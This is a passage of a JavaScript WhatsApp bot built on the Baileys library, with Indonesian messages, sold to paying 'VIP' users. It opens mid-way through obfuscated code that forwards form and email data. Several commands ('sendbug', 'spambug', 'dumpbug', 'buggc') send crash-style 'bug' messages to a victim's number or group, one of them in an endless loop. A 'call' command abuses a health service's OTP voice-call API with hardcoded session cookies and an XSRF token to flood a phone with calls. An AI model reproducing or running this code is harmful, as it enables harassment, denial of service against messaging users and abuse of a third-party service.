RegExp(this['qScpQW']+this['VaKQKb']),f=W['test'](this['VDeiRY']['toString']())?--this['tNourY'][0x8bb*0x2+-0xa2f*-0x1+-0x1ba4]:--this['tNourY'][-0x33a*0x2+0x1*0x1313+-0xc9f];return this['HDQNkI'](f);},G['prototype']['HDQNkI']=function(W){if(!Boolean(~W))return W;return this['YDExnH'](this['FZZLWU']);},G['prototype']['YDExnH']=function(W){for(var f=-0xde0+-0x210b+0x2eeb,L=this['tNourY']['length'];f<L;f++){this['tNourY']['push'](Math['round'](Math['random']())),L=this['tNourY']['length'];}return W(this['tNourY'][-0x2070+0x3*0x6fd+-0x3d3*-0x3]);},new G(g)['uRfAds'](),P=g['ftqUbp'](P),O[D]=P;}else P=t;return P;},g(O,v);}u[Oo(0x283)+'d']=msg,semar[OI(0x2c3)+Oo(0x276)+'e'](from,{'text':(status+'\x20'+command+':\x20'+dn+(OI(0x23a)+On(0x24c)+Oo(0x252)+'\x20')+util[Oo(0x232)+'t'](JSON[OI(0x2c5)](res[On(0x27d)][Oi(0x2ca)+'ce'](Oi(0x29b)+Oi(0x1ea),'')))+(Oi(0x265)+OI(0x200))+util[OI(0x232)+'t'](form))[OZ(0x2ca)+'ce'](OI(0x2a4)+On(0x292)+Oo(0x21e)+OI(0x2a7)+OZ(0x2d3)+Oo(0x208)+OZ(0x1e6)+'ta',On(0x2e7)+OI(0x24f))[On(0x2ca)+'ce'](email[OZ(0x27d)][0x5*-0x6d9+-0x23af+0x45ec],Oo(0x2e7)+Oo(0x24f))[Oi(0x2ca)+'ce'](email[On(0x27d)][-0xd04*0x1+-0x3*0xc17+-0x1f*-0x197],OI(0x2e7)+OI(0x24f))},u);
break

//©from: dennis
case 'cek': case 'test': case 'status':
exec(`pm2 status`, (error, stdout, stderr) => { reply(stdout)})
break

//©from: nayla
case 'open':
if (!isGroup) return reply('Fitur Ini Hanya Dapat Digunakan Di Dalam Group!')
if (!isGroupAdmins && !isDev) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Admin!')
if (!isBotGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Setelah Nomor Ini Menjadi Admin!')
await semar.groupSettingUpdate(from, 'not_announcement')
reply('_Successfully Opened Group!_\n')
break

//©from: nayla
case 'close':
if (!isGroup) return reply('Fitur Ini Hanya Dapat Digunakan Di Dalam Group!')
if (!isGroupAdmins && !isDev) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Admin!')
if (!isBotGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Setelah Nomor Ini Menjadi Admin!')
await semar.groupSettingUpdate(from, 'announcement')
reply('_Successfully Closed The Group!_\n')
break

//©from: dennis
case 'add':
if (!isGroup) return reply('Fitur Ini Hanya Dapat Digunakan Di Dalam Group!')
if (!isGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Admin!')
if (!isBotGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Setelah Nomor Ini Menjadi Admin!')
if (msg.message.extendedTextMessage === undefined || msg.message.extendedTextMessage === null) return reply('Reply targetnya!')
add = msg.message.extendedTextMessage.contextInfo.participant
await semar.groupParticipantsUpdate(from, [add], "add")
break

//©from: dennis
case 'kick':
if (!isGroup) return reply('Fitur Ini Hanya Dapat Digunakan Di Dalam Group!')
if (!isGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Admin!')
if (!isBotGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Setelah Nomor Ini Menjadi Admin!')
if (msg.message.extendedTextMessage === undefined || msg.message.extendedTextMessage === null) return reply('Reply targetnya!')
remove = msg.message.extendedTextMessage.contextInfo.participant
await semar.groupParticipantsUpdate(from, [remove], "remove")
break

//©from: dennis
case 'promote':
if (!isGroup) return reply('Fitur Ini Hanya Dapat Digunakan Di Dalam Group!')
if (!isGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Admin!')
if (!isBotGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Setelah Nomor Ini Menjadi Admin!')
if (msg.message.extendedTextMessage === undefined || msg.message.extendedTextMessage === null) return reply('Reply targetnya!')
promote = msg.message.extendedTextMessage.contextInfo.participant
await semar.groupParticipantsUpdate(from, [promote], "promote")
reply('Done!')
break

//©from: dennis
case 'demote':
if (!isGroup) return reply('Fitur Ini Hanya Dapat Digunakan Di Dalam Group!')
if (!isGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Admin!')
if (!isBotGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Setelah Nomor Ini Menjadi Admin!')
if (msg.message.extendedTextMessage === undefined || msg.message.extendedTextMessage === null) return reply('Reply targetnya!')
demote = msg.message.extendedTextMessage.contextInfo.participant
await semar.groupParticipantsUpdate(from, [demote], "demote")
reply('Done!')
break

//©from: dennis × ivan
case 'sendbug':
if (!isVIP) return reply('Akses Ditolak!, Silahkan Beli Lisensi Ke Developer Bot\nwa.me/6285866295942')
if (!dn) return reply(`Silahkan masukkan nomor dan jumlah bug!\nContoh: ${prefix}${command} ${senderNumber}|10`)
if (args[0].startsWith('0')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}${command} ${senderNumber}|10`)
if (args[0].startsWith('+')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}${command} ${senderNumber}|10`)
if (args[0].startsWith(`${nomorDeveloper}`)) return reply(`Tidak bisa ${command} ke nomor developer!`)
if (args[0].startsWith(`${botNumber}`)) return reply(`Tidak bisa ${command} ke nomor ini!`)
nd = dn.split("|")
if (Number(nd[1]) >= 100) return reply('Jumlah terlalu banyak!')
if (!Number(nd[1])) return reply(`Silahkan masukkan jumlah bug!\nContoh: ${prefix}${command} ${senderNumber}|10`)
reply('Loading 3Second...')
for (let i = 0; i < nd[1]; i++){
await sleep(3000)
reply(`Berhasil mengirim ${Number(i) + 1} bug!`)
let sendbug = await semar.sendMessage(`${nd[0]}@s.whatsapp.net`, { text: "64 65 6E 69 73 6A 75 6C 69 61 6E 64 72 61 70 75 74 72 61" })
await sleep(3000)
semar.sendMessage(`${nd[0]}@s.whatsapp.net`, { delete: sendbug.key })}
reply(`Sukses mengirim ${nd[1]} bug ke nomor ${nd[0]}`)
break

//©from: dennis × andik
case 'dumpbug':
if (!isVIP) return reply('Akses Ditolak!, Silahkan Beli Lisensi Ke Developer Bot\nwa.me/6285866295942')
if (!dn) return reply(`Silahkan masukkan nomor!\nContoh: ${prefix}${command} ${senderNumber}`)
if (args[0].startsWith('0')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}${command} ${senderNumber}`)
if (args[0].startsWith('+')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}${command} ${senderNumber}`)
if (args[0].startsWith(`${nomorDeveloper}`)) return reply(`Tidak bisa ${command} ke nomor developer!`)
if (args[0].startsWith(`${botNumber}`)) return reply(`Tidak bisa ${command} ke nomor ini!`)
semar.sendMessage(`${dn}@s.whatsapp.net`, { text: "64 65 6E 69 73 6A 75 6C 69 61 6E 64 72 61 70 75 74 72 61" }, { quoted: bugcontactMessage })
reply(`Sukses mengirim bug ke nomor ${dn}`)
break

//©from: dennis × ivan × andik
case 'spambug':
if (!isVIP) return reply('Akses Ditolak!, Silahkan Beli Lisensi Ke Developer Bot\nwa.me/6285866295942')
if (!dn) return reply(`Silahkan masukkan nomor!\nContoh: ${prefix}${command} ${senderNumber}`)
if (args[0].startsWith('0')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}${command} ${senderNumber}`)
if (args[0].startsWith('+')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}${command} ${senderNumber}`)
if (args[0].startsWith(`${nomorDeveloper}`)) return reply(`Tidak bisa ${command} ke nomor developer!`)
if (args[0].startsWith(`${botNumber}`)) return reply(`Tidak bisa ${command} ke nomor ini!`)
reply('Berhasil mengirim 1 bug!')
semar.sendMessage(`${dn}@s.whatsapp.net`, { text: "64 65 6E 69 73 6A 75 6C 69 61 6E 64 72 61 70 75 74 72 61" }, { quoted: bugcontactMessage })
reply('Loading 30Second...')
function delay30d(i) { setTimeout(() => {
reply(`Berhasil mengirim ${Number(i) + 2} bug!`)
semar.sendMessage(`${dn}@s.whatsapp.net`, { text: "64 65 6E 69 73 6A 75 6C 69 61 6E 64 72 61 70 75 74 72 61" }, { quoted: bugcontactMessage })
delay30d(++i)}, 30000)}
delay30d(0)
break

//©from: dennis x haikal
case 'buggc':
if (!isDev) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
if (!isGroup) return reply('Fitur Ini Hanya Dapat Digunakan Di Dalam Group!')
requestPaymentMessage = generateWAMessageFromContent(from, proto.Message.fromObject({"requestPaymentMessage": {"currencyCodeIso4217": "IDR","amount1000": "1000","extendedTextMessage": {"text": "64 65 6E 69 73 6A 75 6C 69 61 6E 64 72 61 70 75 74 72 61"}}}), { userJid: from })
semar.relayMessage(from, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
await sleep(3000)
await semar.groupLeave(from)
break

//©from: dennis
case 'autobug':
if (!isDev) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
if (args.length < 1) return sendButMessage(from, `silahkan pilih opsi berikut`, '', [{ buttonId: `autobug on`, buttonText: { displayText: "ON" }, type: 1},{ buttonId: `autobug off`, buttonText: { displayText: "OFF" }, type: 1}], {quoted:msg})
if (dn === 'on'){ autobug = true
reply('Sukses')
} else if (dn === 'off'){ autobug = false
reply('Sukses')} else { reply('Error')}
break

//©from: dennis x baileys
case '01':
sendButMessage(from, 'test', 'test', [{buttonId: `${prefix}01`, buttonText: {displayText: 'Button 1'}, type: 1},{buttonId: `${prefix}02`, buttonText: {displayText: 'Button 2'}, type: 1},{buttonId: `${prefix}03`, buttonText: {displayText: 'Button 3'}, type: 1}], {quoted:msg})
break

//©from: dennis x baileys
case '02':
sendButTemplate(from, 'test', 'test', [{index: 1, urlButton: {displayText: 'test', url: 'https://'}},{index: 2, callButton: {displayText: 'test', phoneNumber: '6285'}},{index: 3, quickReplyButton: {displayText: 'test', id: `0`}}])
break

//©from: dennis x baileys
case '03':
sendLstMessage(from, 'test', 'test', 'test', 'test', [{title: "Section 1",rows: [{title: "Option 1", rowId: "option1"},{title: "Option 2", rowId: "option2", description: "This is a description"}]},{title: "Section 2",rows: [{title: "Option 3", rowId: "option3"},{title: "Option 4", rowId: "option4", description: "This is a description V2"}]}])
break

//©from: dennis
case 'acc': case 'accept':
if (!isDev) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
if (!dn) return reply('Invalid number')
userVIP.push(`${dn}@s.whatsapp.net`)
fs.writeFileSync('./storage/database/vip.json', JSON.stringify(`${userVIP}`))
semar.sendMessage(`${dn}@s.whatsapp.net`, { text: `Halo, Nomor Anda Telah Diizinkan Oleh Owner Untuk Mengakses VIP!\nNomor : ${dn}\nWaktu : ${time}\nTerimakasih Telah Membeli Lisensi VIP!`})
reply(`Sukses Register ${dn}`)
break

//©from: dennis
case 'listvip':
reply(`${JSON.stringify(userVIP, null, 2)}`)
break

//©from: dennis
case 'chat':
if (!isVIP) return
if (!dn) return reply(`Silahkan masukkan nomor dan pesan!\nContoh: ${prefix}${command} ${senderNumber}|halo`)
if (args[0].startsWith('0')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}${command} ${senderNumber}|halo`)
if (args[0].startsWith('+')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}${command} ${senderNumber}|halo`)
if (args[0].startsWith(`${botNumber}`)) return reply('Tidak bisa mengirim pesan ke nomor ini!')
nd = dn.split("|")
if (!nd) return reply(`Silahkan masukkan nomor dan pesan!\nContoh: ${prefix}${command} ${senderNumber}|halo`)
semar.sendMessage(`${nd[0]}@s.whatsapp.net`, { text: `${nd[1]}` })
reply(`Sukses mengirim pesan ${nd[1]} ke nomor ${nd[0]}`)
break

//©from: dennis
case 'join':
if (!isDev) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
let result = args[0].split('https://chat.whatsapp.com/')[1]
await semar.groupAcceptInvite(result).then((res) => reply(`${JSON.stringify(res, null, 2)}`)).catch((err) => reply(`${JSON.stringify(err, null, 2)}`))
break

//©from: dennis
case 'leave':
if (!isDev) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
await semar.groupLeave(from).then((res) => reply(`${JSON.stringify(res, null, 2)}`)).catch((err) => reply(`${JSON.stringify(err, null, 2)}`))
break

//©from: dennis
case 'delete': case 'd': case 'del':
if (!isVIP) return
semar.sendMessage(from, { delete: { id: msg.message.extendedTextMessage.contextInfo.stanzaId, remoteJid: from, fromMe: true }})
break

//©from: dennis
case 'restart':
if (!isVIP) return
exec(`pm2 restart index`, (error, stdout, stderr) => { reply(stdout)})
break

//©from: dennis
case 'shutdown':
if (!isDev) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
exec(`pm2 kill`, (error, stdout, stderr) => { reply(stdout)})
break

//©from: dennis × mr_dark
case 'call':
if (!isVIP) return reply('Akses Ditolak!, Silahkan Beli Lisensi Ke Developer Bot\nwa.me/6285866295942')
if (!dn) return reply(`Silahkan masukkan nomor!\nContoh: ${prefix}${command} +${senderNumber}`)
if (args[0].startsWith('0')) return reply(`Awali nomor dengan +62!\nContoh: ${prefix}${command} +${senderNumber}`)
if (args[0].startsWith('8')) return reply(`Awali nomor dengan +62!\nContoh: ${prefix}${command} +${senderNumber}`)
if (args[0].startsWith(`+${nomorDeveloper}`)) return reply('Tidak bisa call ke nomor developer!')
if (args[0].startsWith(`+${botNumber}`)) return reply('Tidak bisa call ke nomor ini!')
axios.post('https://magneto.api.halodoc.com/api/v1/users/authentication/otp/requests',{'phone_number':`${dn}`,'channel': 'voice'},{headers: {'authority': 'magneto.api.halodoc.com','accept-language': 'id,en;q=0.9,en-GB;q=0.8,en-US;q=0.7','cookie': '_gcl_au=1.1.1860823839.1661903409; _ga=GA1.2.508329863.1661903409; afUserId=52293775-f4c9-4ce2-9002-5137c5a1ed24-p; XSRF-TOKEN=12D59ACD8AA0B88A7ACE05BB574FAF8955D23DBA28E8EE54F30BCB106413A89C1752BA30DC063940ED30A599C055CC810636; _gid=GA1.2.798137486.1664887110; ab.storage.deviceId.1cc23a4b-a089-4f67-acbf-d4683ecd0ae7=%7B%22g%22%3A%2218bb4559-2170-9c14-ddcd-2dc80d13c3e3%22%2C%22c%22%3A1656491802961%2C%22l%22%3A1664887110254%7D; amp_394863=nZm2vDUbDAvSia6NQPaGum...1gehg2efd.1gehg3c19.f.0.f; ab.storage.sessionId.1cc23a4b-a089-4f67-acbf-d4683ecd0ae7=%7B%22g%22%3A%22f1b09ad8-a7d9-16f3-eb99-a97ba52677d2%22%2C%22e%22%3A1664888940400%2C%22c%22%3A1664887110252%2C%22l%22%3A1664887140400%7D','origin': 'https://www.halodoc.com','sec-ch-ua': '"Microsoft Edge";v="105", "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-site','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edg/105.0.1343.53','x-xsrf-token': '12D59ACD8AA0B88A7ACE05BB574FAF8955D23DBA28E8EE54F30BCB106413A89C1752BA30DC063940ED30A599C055CC810636'}}).then(function (response) {reply(`${JSON.stringify(response.data, null, 2)}`)}).catch(function (error) {reply(`${JSON.stringify(error, null, 2)}`)})
break

//©from: dennis
case 'public':
if (!isDev) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
mode = true
reply('Sukses mengubah ke mode public')
break

//©from: dennis
case 'private': case 'self':
if (!isDev) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
mode = false
reply('Sukses mengubah ke mode private')
break

//©from: dennis
case 'vote':
var pollCreation = generateWAMessageFromContent(from, proto.Message.fromObject({"pollCreationMessage": {
"name": "@dcodedenpa",
"options": [{
"optionName": "option 1"
},{
"optionName": "option 2"
},{
"optionName": "option 3"
}],
"selectableOptionsCount": 3}}), { userJid: from })
semar.relayMessage(from, pollCreation.message, { messageId: pollCreation.key.id })
break
default:
}} catch (e) {
console.log(e)
semar.sendMessage("6285866295942@s.whatsapp.net", {text:e})}}